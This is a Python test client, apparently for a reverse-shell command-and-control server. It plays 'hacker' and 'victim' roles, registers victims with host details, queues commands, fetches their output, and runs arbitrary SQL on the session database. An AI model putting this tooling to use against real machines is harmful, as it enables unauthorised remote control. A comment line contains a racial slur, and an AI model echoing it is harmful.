import argparse as ag
import datetime
import os
import shlex
import sys
from dataclasses import dataclass
from http.client import HTTPConnection, HTTPResponse
from http.client import responses as response_dict
from pathlib import Path
from typing import Any, Callable, Mapping, Optional

import typ.json as js
from colorama import Fore as F
from colorama import Style as S
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import FileHistory

from reverse_shell.server import server_helper as sh
from reverse_shell.utils import decode_token as decode_b64
from reverse_shell.utils import encode_token as encode_b64

# Mimic the json structure of the profile generated
# by the server.


@dataclass
class Tokens:
    auth_token: str
    hacker_token: str


@dataclass
class ServerCommands:
    register: str
    fetch_cmd: str
    post_cmd: str
    fetch_res: str
    post_res: str
    create_session: str
    get_session: str
    list_victims: str
    exit_session: str


@dataclass
class Address:
    port: int
    ip: str
    connect_ip: str


@dataclass
class Profile:
    tokens: Tokens
    server_commands: ServerCommands
    address: Address


@dataclass
class Output:
    stdout: str
    stderr: str


@dataclass
class PostResJsonBody:
    session_id: str
    response: Output
    empty: bool
    command_status_code: Optional[int]
    failed_to_execute: bool


@dataclass
class PostCmdJsonBody:
    session_id: str
    command: str
    empty: bool


@dataclass
class VictimInfo:
    host_name: Optional[str]
    os: Optional[str]
    arch: Optional[str]
    ram: Optional[str]
    clock_speed: Optional[str]


class Client:
    hacker = 1
    victim = 2


# Overriding the request method to enable global default headers
class Connection(HTTPConnection):
    def __init__(
        self, host: str, port: int | None = None, headers: Mapping[str, str] = {}
    ):
        self.default_headers = headers
        super().__init__(host, port)

    def crequest(
        self,
        method: str,
        url: str,
        body: str | None = None,
        headers: Mapping[str, str] = {},
        *,
        encode_chunked: bool = False,
    ):
        super().request(
            method,
            url,
            body=body,
            headers={**self.default_headers, **headers},
            encode_chunked=encode_chunked,
        )


class ArgumentParser(ag.ArgumentParser):
    # Disabling exiting when error occurs
    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, sys.stderr)
        raise ValueError


@dataclass
class Error:
    message: str


def prompt_input(prompt):
    session: PromptSession[str] = PromptSession(
        message=ANSI(prompt), history=FileHistory(".ztest_history")
    )

    try:
        user_input = session.prompt()
    except KeyboardInterrupt:
        user_input = None  # Handle Ctrl+C gracefully

    return user_input


def get_connection(
    profile: Profile, client_type: int, client_id: str
) -> Connection | Error:
    # the default headers
    default_headers = {
        "Authorization": f"Basic {encode_b64(profile.tokens.auth_token)}",
        "client-type": client_type.__str__(),
        "client-id": client_id,
    }
    if client_type == Client.hacker:
        default_headers["hacker-token"] = encode_b64(profile.tokens.hacker_token)

    conn = Connection(profile.address.connect_ip, profile.address.port, default_headers)
    try:
        conn.connect()
    except Exception:
        return Error("connection problems!")

    return conn


def display_response(
    response: HTTPResponse, formatter: Optional[Callable[[Any], str]] = None
):
    print(
        f"{F.BLUE}status code{S.RESET_ALL}: {response_dict[response.status]}({response.status})"
    )
    if (content_length := response.getheader("content-length")) is not None:
        body = response.read(int(content_length))
        data = decode_b64(body)

        content_type = response.getheader("content-type")
        if content_type is not None and content_type == "application/json":
            if formatter is None:
                # if the content is json apply indents
                data = js.json.loads(data)
                data = js.json.dumps(data, indent=2)
            else:
                # if we are provided with a formatter then format
                # the json using it.
                data = js.json.loads(data)
                data = formatter(data)
        print(f"{F.BLUE}body{S.RESET_ALL}: {data}")


# ---- Handling commands
def register(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("client_id", type=str)
    ap.add_argument(
        "-t", "--client-type", type=str, choices=["hacker", "victim"], required=True
    )
    ap.add_argument("--host-name", type=str, default=None)
    ap.add_argument("--os", type=str, default=None)
    ap.add_argument("--arch", type=str, default=None)
    ap.add_argument("--ram", type=str, default=None)
    ap.add_argument("--clock-speed", type=str, default=None)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    # Create the client
    client_type = Client.hacker if cmd_args.client_type == "hacker" else Client.victim
    conn = get_connection(profile, client_type, cmd_args.client_id)

    # Make the request
    victim_info = VictimInfo(
        cmd_args.host_name,
        cmd_args.os,
        cmd_args.arch,
        cmd_args.ram,
        cmd_args.clock_speed,
    )

    if type(conn) == Error:
        print(conn.message)
        return

    # Send the request
    elif type(conn) == Connection:
        conn.crequest(
            "POST",
            profile.server_commands.register,
            body=encode_b64(js.dumps(victim_info)),
        )

        display_response(conn.getresponse())


# ---- Hacker commands
def post_cmd(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("command", type=str)
    ap.add_argument("-i", "--id", type=str, required=True)
    ap.add_argument("-s", "--session-id", type=str, required=True)
    ap.add_argument("-e", "--empty", action="store_true")

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, 1, cmd_args.id)

    if type(conn) == Error:
        print(conn.message)
        return

    elif type(conn) == Connection:
        data = PostCmdJsonBody(cmd_args.session_id, cmd_args.command, cmd_args.empty)
        body = encode_b64(js.dumps(data))
        conn.crequest("POST", profile.server_commands.post_cmd, body)

        display_response(conn.getresponse())


def fetch_res(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("-i", "--client_id", type=str, required=True)
    ap.add_argument("-s", "--session-id", type=str, required=True)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, 1, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
        return

    elif type(conn) == Connection:
        body = encode_b64(cmd_args.session_id)
        conn.crequest("GET", profile.server_commands.fetch_res, body)

        display_response(conn.getresponse())


def create_session(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("victim_id", type=str)
    ap.add_argument("-i", "--client-id", type=str, required=True)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.hacker, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
        return

    elif type(conn) == Connection:
        conn.crequest(
            "POST",
            profile.server_commands.create_session,
            encode_b64(cmd_args.victim_id),
        )
        display_response(conn.getresponse())


def list_victims_formatter(data: list[dict[str, Any]]) -> str:
    lines = [""]
    for i in range(0, len(data)):
        for key, val in data[i].items():
            lines.append(f"{F.LIGHTYELLOW_EX}{key}{S.RESET_ALL}: {val}")
        if i != len(data) - 1:
            lines.append("\n")
    return "\n".join(lines)


def list_victims(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    # TODO: Implement victim filtration
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("client_id", type=str)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.hacker, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
        return

    elif type(conn) == Connection:
        conn.crequest("GET", profile.server_commands.list_victims)
        display_response(conn.getresponse(), formatter=list_victims_formatter)


def exit_session(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("-i", "--client-id", required=True, type=str)
    ap.add_argument("-s", "--session-id", required=True, type=str)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.hacker, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
        return
    elif type(conn) == Connection:
        conn.crequest(
            "DELETE",
            profile.server_commands.exit_session,
            body=encode_b64(cmd_args.session_id),
        )
        display_response(conn.getresponse())


# --- Victim commands
def fetch_cmd(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("-i", "--client-id", required=True, type=str)
    ap.add_argument("-s", "--session-id", required=True, type=str)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.victim, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
    elif type(conn) == Connection:
        conn.crequest(
            "GET",
            profile.server_commands.fetch_cmd,
            body=encode_b64(cmd_args.session_id),
        )
        display_response(conn.getresponse())


def post_res(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("-i", "--client-id", required=True, type=str)
    ap.add_argument("-s", "--session-id", required=True, type=str)
    ap.add_argument("--stdout", type=str, default="")
    ap.add_argument("--stderr", type=str, default="")
    ap.add_argument("-csc", "--command-status-code", type=int, default=None)
    ap.add_argument("-f", "--failed-to-execute", action="store_true")
    ap.add_argument("-e", "--empty", action="store_true")

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.victim, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
    elif type(conn) == Connection:
        body = PostResJsonBody(
            cmd_args.session_id,
            Output(cmd_args.stdout, cmd_args.stderr),
            cmd_args.empty,
            cmd_args.command_status_code,
            cmd_args.failed_to_execute,
        )
        conn.crequest(
            "POST", profile.server_commands.post_res, body=encode_b64(js.dumps(body))
        )
        display_response(conn.getresponse())


def get_session(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("client_id", type=str)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    conn = get_connection(profile, Client.victim, cmd_args.client_id)

    if type(conn) == Error:
        print(conn.message)
    elif type(conn) == Connection:
        conn.crequest("GET", profile.server_commands.get_session)
        display_response(conn.getresponse())


def format_db_query_result(
    query_result: list[tuple[Any]],
    key_list: list[str],
    val_fixer: Optional[Callable[[Any, Any], Any]] = None,
) -> str:
    list_str = []
    for i in range(0, len(query_result)):
        for key, val in zip(key_list, query_result[i]):
            if val_fixer is not None:
                val = val_fixer(key, val)
            list_str.append(f"{F.LIGHTMAGENTA_EX}{key}{S.RESET_ALL}: {val}")

        if i != len(query_result) - 1:
            list_str.append("\n")
    return "\n".join(list_str)


def list_clients(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    # Fetching all the clients
    query = "SELECT * FROM clients"
    result = session_db.query(query)

    def val_fixer(key: Any, val: Any) -> Any:
        # making the data easier to understand
        if key == "last_requested":
            return datetime.datetime.fromtimestamp(val)
        if key == "client_type":
            if val == "1":
                return "Hacker(1)"
            else:
                return "Victim(2)"
        else:
            return val

    # making the output pretty
    if result is not None:
        key_list = ["client_id", "client_type", "last_requested", "status"]
        formatted_result = format_db_query_result(result, key_list, val_fixer)
        if formatted_result.strip() != "":
            print(formatted_result)
        else:
            print("There are no clients in the database.")
    else:
        print(f"{F.RED}error{S.RESET_ALL}: Couldn't execute query on database.")


def list_victim_info(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    # Fetching all the victim
    query = "SELECT * FROM victim_info"
    result = session_db.query(query)

    if result is not None:
        key_list = ["client_id", "host_name", "os", "arch", "clock_speed", "ram"]
        formatted_result = format_db_query_result(result, key_list)
        if formatted_result.strip() != "":
            print(formatted_result)
        else:
            print("There are no victims in the database.")
    else:
        print(f"{F.RED}error{S.RESET_ALL}: Couldn't execute query on database.")


def execute_on_db(
    command_name: str, args: list[str], profile: Profile, session_db: sh.Database
):
    ap = ArgumentParser(prog=command_name)
    ap.add_argument("statement", type=str)

    try:
        cmd_args = ap.parse_args(args)
    except ValueError:
        return

    result = session_db.execute(cmd_args.statement)
    if result is not None:
        print(f"{F.GREEN}{S.BRIGHT}STATEMENT EXECUTED SUCCESSFULLY.{S.RESET_ALL}")
    else:
        print(f"{F.RED}error{S.RESET_ALL}: Couldn't execute statement on database.")


# register | hacker bython17
# register | victim helloworld ldakjfsljf
# list-clients
# create_session bython17 --session_id hello brother
# get_session nigga

# bython17 create_session hello
# helloworld get_session


def gen_help(cmd_handlers) -> str:
    commands = "|".join(
        [f"{S.DIM}{command}{S.RESET_ALL}" for command in list(cmd_handlers.keys())]
    )
    return f"usage: command [args]\n{F.BLUE}Note{S.RESET_ALL}: Most commands have help messages that can be invoked using -h\n{F.MAGENTA}Commands{S.RESET_ALL}: [{commands}]"


def initiate_interactive_prompt(profile, session_db):
    command_and_handlers: dict[
        str, Callable[[str, list[str], Profile, sh.Database], None]
    ] = {
        "register": register,
        "list_clients": list_clients,
        "post_cmd": post_cmd,
        "fetch_res": fetch_res,
        "create_session": create_session,
        "list_victims": list_victims,
        "exit_session": exit_session,
        "fetch_cmd": fetch_cmd,
        "post_res": post_res,
        "get_session": get_session,
        "list_victim_info": list_victim_info,
        "execute": execute_on_db,
    }

    prompt = f"{F.GREEN}ztest{S.RESET_ALL}$ "
    command_str = ""
    while True:
        command_str = prompt_input(prompt).lower().strip()
        command_lst = shlex.split(command_str)

        if len(command_lst) == 0:
            continue

        elif command_lst[0] == "clear":
            if sys.platform[:3] == "win":
                os.system("cls")
            else:
                os.system("clear")

        elif command_lst[0] == "help":
            print(gen_help(command_and_handlers))

        elif command_lst[0] == "exit":
            break

        else:
            command = command_lst[0]
            args = command_lst[1:]

            try:
                command_and_handlers[command](command, args, profile, session_db)
            except KeyError:
                print(gen_help(command_and_handlers))


def exit_with_error(msg: str):
    print(f"error: {msg}", file=sys.stderr)
    sys.exit(1)


def parse_profile(profile_path: Path):
    profile_str = profile_path.read_text()
    try:
        profile = js.loads(Profile, profile_str)
    except (js.json.JSONDecodeError, js.JsonError):
        # The json format is not correct
        exit_with_error("Invalid JSON content.")

    return profile


def get_database(session_data_path: Path) -> sh.Database:
    return sh.Database(session_data_path)


def get_profile_and_db():
    parser = ag.ArgumentParser(prog="ztest")
    parser.add_argument("profile", type=Path, help="Profile generated by the server.")
    parser.add_argument(
        "session_data", type=Path, help="data.db file generated by server."
    )
    args = parser.parse_args()
    # Validating profile
    profile_path = args.profile
    if not profile_path.resolve().is_file():
        exit_with_error(f"The profile at '{args.profile}' doesn't exist.")
    # Validating session_data
    session_data_path = args.session_data
    if not session_data_path.resolve().is_file():
        exit_with_error(f"The database at '{args.session_data}' doesn't exist.")
    return (profile_path, session_data_path)


def main():
    profile_path, session_data_path = get_profile_and_db()
    profile = parse_profile(profile_path)
    session_db = get_database(session_data_path)

    initiate_interactive_prompt(profile, session_db)


if __name__ == "__main__":
    main()
